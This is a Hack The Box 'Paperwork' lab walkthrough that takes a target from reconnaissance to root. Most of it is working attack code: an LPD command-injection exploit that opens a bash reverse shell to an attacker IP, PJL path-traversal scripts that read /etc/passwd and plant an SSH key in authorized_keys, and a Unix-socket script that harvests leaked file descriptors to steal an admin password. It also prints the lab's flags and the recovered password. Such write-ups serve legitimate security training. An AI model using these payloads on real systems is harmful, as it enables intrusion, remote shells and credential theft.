@@ -1,0 +1,246 @@
+HTB Paperwork — Full Detailed Walkthrough
+Phase 1: Reconnaissance
+nmap -p- -T4 --min-rate 1000 --open 10.129.248.117
+
+Port	Service	Notes
+22	SSH	OpenSSH 10.0p2, Ubuntu 25.10
+80	HTTP	Nginx — "Intranet | Document Archiving Service"
+1515	LPD	Custom Python printer service
+
+Register the vhost:
+
+echo "10.129.248.117 paperwork.htb" | sudo tee -a /etc/hosts
+
+Browse to http://paperwork.htb/ — the web app exposes the LPD server source at /opt/LPDServer/server.py.
+
+Phase 2: Foothold — LPD Command Injection
+The Vulnerable Code
+# /opt/LPDServer/server.py
+job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    line = line.strip()
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+#                                            ^              ^
+#                                            |              |
+#                                   breakout point     trailing comment
+
+The J field (job name) is interpolated directly into a shell command. The single quote after Archive: is the breakout point.
+
+The LPD Binary Protocol
+┌─────────────────────────────────────────────────────────────────────┐
+│  1. Client → Server:  \x02 + "archive_intake" + \n                  │
+│     Server → Client:  \x00 (accepted) or \x01 (rejected)            │
+│                                                                    │
+│  2. Client → Server:  \x02 + <size> + "cfA001" + <user> + \n       │
+│     Server → Client:  \x00 (ack)                                    │
+│                                                                    │
+│  3. Client → Server:  <control file bytes> + \x00                  │
+│     Server → Client:  \x00 (ack)                                    │
+│                                                                    │
+│  4. Client → Server:  \x03 + <data file> + \x00  (optional)        │
+│     Server → Client:  \x00 (ack)                                    │
+└─────────────────────────────────────────────────────────────────────┘
+
+The control file format:
+
+H<user>\n
+J<job_name>\n
+
+The Exploit Script
+#!/usr/bin/env python3
+import socket
+
+TARGET_IP = "10.129.248.117"
+TARGET_PORT = 1515
+ATTACKER_IP = "10.10.14.27"
+ATTACKER_PORT = 9001
+
+# Breakout: close the single quote, inject bash reverse shell,
+# then # comments out the trailing >> /tmp/archive.log
+cmd = f"'; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1' #"
+
+# Control file: H field (user) + J field (job name = our payload)
+control = f"Hattacker\nJ{cmd}\n"
+
+# Header: \x02 + size + "cfA001" + username + \n
+header = f"\x02{len(control)} cfA001attacker\n".encode()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TARGET_IP, TARGET_PORT))
+
+# Step 1: Request queue
+s.send(b'\x02archive_intake\n')
+r = s.recv(1)
+assert r == b'\x00', f"Queue rejected: {r!r}"
+
+# Step 2: Send control file header
+s.send(header)
+s.recv(1)
+
+# Step 3: Send control file body (triggers injection)
+s.send(control.encode() + b'\x00')
+s.recv(1)
+s.close()
+print(f"[+] Payload sent. Check listener on :{ATTACKER_PORT}")
+
+What the shell executes:
+
+echo 'Archive: '; bash -c 'bash -i >& /dev/tcp/10.10.14.27/9001 0>&1' #' >> /tmp/archive.log
+#                ^  ^                                              ^
+#                |  |                                              |
+#                |  |                                              └── comments out the rest
+#                |  └── reverse shell to attacker
+#                └── closes the echo string
+
+Result: Interactive shell as lp (uid=7, home=/var/spool/lpd)
+
+Shell Upgrade
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z, then:
+stty raw -echo; fg
+# Now: export TERM=xterm-256color; export PATH=$PATH:/usr/sbin:/sbin
+
+Phase 3: Lateral Movement — lp → archivist
+Discovering the Internal Service
+ss -tlnp
+
+Expected:
+
+127.0.0.1:9100   (PJL JetDirect printer service)
+
+This service is localhost-only — not reachable from your attacker machine. Since you're already on the target, connect directly.
+
+The PJL Path Traversal
+The service has a virtual filesystem rooted at a printer directory. Path translation:
+
+def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))
+
+os.path.normpath resolves .. but there's no check that the result stays within self._root. So:
+
+Input:  "0:/../../../etc/passwd"
+Clean:  "/../../../etc/passwd"
+Result: /etc/passwd  ← escaped the printer root
+
+This is the same class as CVE-2010-4107 (HP LaserJet PJL traversal, 2010).
+
+Step 1: Read a File (Proof of Concept)
+python3 -c "
+import socket, time
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../etc/passwd\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
+time.sleep(1)
+data = b''
+try:
+    while True:
+        c = s.recv(4096)
+        if not c: break
+        data += c
+except: pass
+s.close()
+print(data.decode(errors='ignore'))
+"
+
+Output: Full /etc/passwd contents (confirms traversal works).
+
+
+python read /etc/passwd file example
+
+View all
+Step 2: Create .ssh Directory
+python3 -c "
+import socket, time
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(b'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"0:/../../../home/archivist/.ssh/placeholder\" SIZE=0\r\n\x1b%-12345X')
+time.sleep(1); s.close()
+print('done')
+"
+
+Step 3: Write Your SSH Public Key
+python3 -c "
+import socket, time
+key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqIWgsLmp0a8VPYxWKZETdLXYIUMSK3wMlh11J0OsuB white@white\n'
+p = '0:/../../../home/archivist/.ssh/authorized_keys'
+s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
+s.send(f'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"{p}\" SIZE={len(key)}\r\n{key}\x1b%-12345X'.encode())
+time.sleep(2); s.close()
+print('done')
+"
+
+Step 4: SSH In
+# From attacker machine:
+ssh -i ~/.ssh/id_ed25519 archivist@10.129.248.117
+
+cat user.txt
+# e6f60044a411e3b49f3e699284f5fe28
+
+Phase 4: Privilege Escalation — archivist → root
+Enumeration
+ps aux | grep paperwork
+# root  ...  python3 /usr/bin/paperwork-daemon
+
+ls -la /run/paperwork/
+# srw-rw---- 1 root paperwork  mgmt.sock
+
+groups
+# archivist : archivist paperwork
+
+Daemon runs as root
+Socket is group-writable to paperwork
+archivist is a member of paperwork
+The SCM_RIGHTS Mechanism
+The daemon:
+
+Opens /etc/paperwork/admin_pins.conf at startup (keeps fd alive)
+Monitors /home/archivist/printer/logs/commands.log for keywords (FSUPLOAD, FSDOWNLOAD, FSQUERY)
+When triggered, calls sendmsg() with SCM_RIGHTS to pass the open file descriptors to the socket client
+Why this bypasses permissions: The kernel duplicates the fd into the receiver's table. The receiver inherits the open file description's access mode (set at open() time by root), not its own uid permissions. os.pread(fd, ...) reads through the already-open file description — no re-check of filesystem permissions.
+
+The Exploit
+python3 -c "
+import socket, array, os
+
+# Trigger the forensic branch
+with open('/home/archivist/printer/logs/commands.log', 'a') as f:
+    f.write('FSUPLOAD\n')
+
+# Connect to the daemon socket
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect('/run/paperwork/mgmt.sock')
+
+# Receive message + ancillary data (file descriptors)
+msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8))
+print(msg.decode(errors='ignore'))
+
+# Extract and read leaked fds
+for level, ctype, cdata in ancdata:
+    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
+        fds = array.array('i')
+        fds.frombytes(cdata)
+        for fd in fds:
+            data = os.pread(fd, 4096, 0)
+            print(data.decode(errors='ignore'))
+            os.close(fd)
+
+s.close()
+"
+
+Output:
+
+FORENSIC_ALERT: suspicious activity detected
+...
+admin:ApparelMortuaryCedar22
+
+Root Access
+su root
+# Password: ApparelMortuaryCedar22
+
+cat /root/root.txt
+# 593a21d711a45d3d95806999dd6a966a
+
